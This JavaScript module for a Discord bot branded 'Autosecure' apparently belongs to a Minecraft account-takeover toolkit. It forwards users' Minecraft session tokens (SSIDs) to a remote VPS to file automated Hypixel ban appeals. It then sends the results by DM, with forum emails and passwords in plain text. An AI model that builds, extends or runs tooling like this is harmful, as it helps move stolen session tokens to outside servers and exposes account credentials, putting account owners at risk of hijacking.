const { EmbedBuilder } = require("discord.js")
const config = require("../../../config.json")
const profile = require("../minecraft/profile")
const secondvpsip = config.vpsip2;
const axios = require('axios');
const { queryParams } = require("../../../db/database.js");
const { codeblock } = require("../process/helpers.js");


let client;

async function appealmsg(userid, ssid) {
    let prof = await profile(ssid);
    if (!prof?.name) {
        return {
            embeds: [
                new EmbedBuilder()
                    .setTitle("❌ Invalid Minecraft Account")
                    .setDescription("The provided SSID is invalid or the account doesn't exist.")
                    .setColor(0xff4757)
                    .setThumbnail('https://cdn.pfps.gg/pfps/59339-erwan-meunier.gif')
                    .addFields({
                        name: '💡 What to do?',
                        value: '• Make sure the SSID is correct\n• Check if the SSID is still valid\n• Try generating a new SSID',
                        inline: false
                    })
                    .setFooter({ text: 'Appeal System • Autosecure' })
                    .setTimestamp()
            ],
            ephemeral: true
        };
    }

    const headers = {
        key: config.authkey,
        ssid: ssid,
        name: prof.name,
        user: userid
    };

    const url = `http://${config.vpsip2}:8080/createappeal`;

    let response = await axios.post(url, null, { headers: headers });
    const responseData = response?.data;

    if (response.status !== 200) {
        if (responseData?.error) {
            return {
                embeds: [
                    new EmbedBuilder()
                        .setTitle("⚠️ Appeal System Error")
                        .setDescription(`**Error:** ${responseData.error}\n\nThis isn't your fault, please make a ticket or DM me ASAP.`)
                        .setColor(0xffa502)
                        .setThumbnail('https://cdn.pfps.gg/pfps/59339-erwan-meunier.gif')
                        .addFields({
                            name: '🔧 Error Details',
                            value: `Server returned status: ${response.status}`,
                            inline: false
                        })
                        .setFooter({ text: 'Appeal System • Autosecure' })
                        .setTimestamp()
                ],
                ephemeral: true
            };
        } else {
            return {
                embeds: [
                    new EmbedBuilder()
                        .setTitle("❌ Unknown Error")
                        .setDescription("An unknown error occurred while processing your appeal.")
                        .setColor(0xff4757)
                        .setThumbnail('https://cdn.pfps.gg/pfps/59339-erwan-meunier.gif')
                        .addFields({
                            name: '🔧 Error Details',
                            value: `Server returned status: ${response.status}`,
                            inline: false
                        })
                        .setFooter({ text: 'Appeal System • Autosecure' })
                        .setTimestamp()
                ],
                ephemeral: true
            };
        }
    } else {
        if (responseData?.queue === "alreadyin"){
            return {
                embeds: [
                new EmbedBuilder()
                    .setTitle("⏳ Already in Queue")
                    .setDescription(`**${prof.name}** is already in the appeal queue.`)
                    .setColor(0xffa502)
                    .setThumbnail(`https://visage.surgeplay.com/bust/${prof.name}.png?y=-40`)
                    .addFields({
                        name: '📊 Queue Position',
                        value: `**${responseData?.queue2 || "Unknown"}**`,
                        inline: true
                    })
                    .addFields({
                        name: '⏰ Status',
                        value: 'Just wait till it\'s done!',
                        inline: true
                    })
                    .setFooter({ text: 'Appeal System • Autosecure' })
                    .setTimestamp()
            ]   
            }
        }
        return {
            embeds: [
                new EmbedBuilder()
                    .setTitle("✅ Appeal Added to Queue")
                    .setDescription(`**${prof.name}** has been successfully added to the appeal queue.`)
                    .setColor(0x2ed573)
                    .setThumbnail(`https://visage.surgeplay.com/bust/${prof.name}.png?y=-40`)
                    .addFields({
                        name: '📊 Queue Position',
                        value: `**${responseData?.queue || "N/A"}**`,
                        inline: true
                    })
                    .addFields({
                        name: '⏰ Estimated Time',
                        value: 'Processing time varies',
                        inline: true
                    })
                    .addFields({
                        name: '📝 What happens next?',
                        value: 'Your appeal will be processed automatically. You\'ll receive a DM when it\'s complete.',
                        inline: false
                    })
                    .setFooter({ text: 'Appeal System • Autosecure' })
                    .setTimestamp()
            ]
        };
    }
}

async function finishedappealmsg(obj, uid) {
    console.log(`Finishing appeal with ID: ${obj.appealId} and UID: ${uid}`)
    
    try {
        const user = await client.users.fetch(obj.userid);
        if (!user) {
            console.error(`User ${obj.userid} not found`);
            return;
        }

        const appealData = obj.data ? (typeof obj.data === 'string' ? JSON.parse(obj.data) : obj.data) : null;
    

        


        const embed = new EmbedBuilder()
            .setTitle(`🎉 Hypixel Appeal ${obj.status === "worked" ? "Successful!" : "Completed"}`)
            .setColor(obj.status === "worked" ? 0x2ed573 : 0xffa502)
            .setDescription(`Here's the result of your appeal`)
            .setThumbnail(`https://visage.surgeplay.com/bust/${appealData?.mcUsername || 'Steve'}.png?y=-40`)
            .addFields(
                { name: "📊 Status", value: obj.status === "worked" ? "✅ **Successfully Appealed**" : "❌ **Failed**", inline: true },
                { name: "🆔 Appeal ID", value: `\`${obj.appealId || "N/A"}\``, inline: true },
                { name: "👤 Minecraft Name", value: `\`${appealData?.mcUsername || "N/A"}\``, inline: true },
                { name: "🌐 Forum Account", value: `\`${appealData?.username || "N/A"}\``, inline: true },
                { name: "📧 Forum Email", value: `\`${appealData?.email || "N/A"}\``, inline: true },
                { name: "🔑 Forum Password", value: `\`${appealData?.password || "N/A"}\``, inline: true }
            );

        if (obj.threadurl) {
            embed.addFields(
                { name: "🔗 Appeal Thread", value: `[View your appeal](${obj.threadurl})`, inline: false }
            );
        }

        embed.setFooter({ text: 'Appeal System • Autosecure' })
              .setTimestamp();

        await user.send({ embeds: [embed] });
        console.log(`Sent appeal result to user ${obj.userid}`);

        const deleteSql = "DELETE FROM finishedappeal WHERE id = ?";
        await queryParams(deleteSql, [uid], "run");
        console.log(`Deleted finished appeal with UID ${uid} from database`);
        
    } catch (error) {
        console.error('Error processing appeal message:', error);  
        console.log(
            `Appeal completed for user ${obj.userid}\n` +
            `Status: ${obj.status}\n` +
            `Appeal ID: ${obj.appealId}\n` +
            `UID: ${uid}`
        );
    }
}


function initializeappealclient(discordClient) {
    client = discordClient;
    console.log('Appealmsg initialized with Discord client');
}

module.exports = {
    appealmsg,
    finishedappealmsg,
    initializeappealclient
}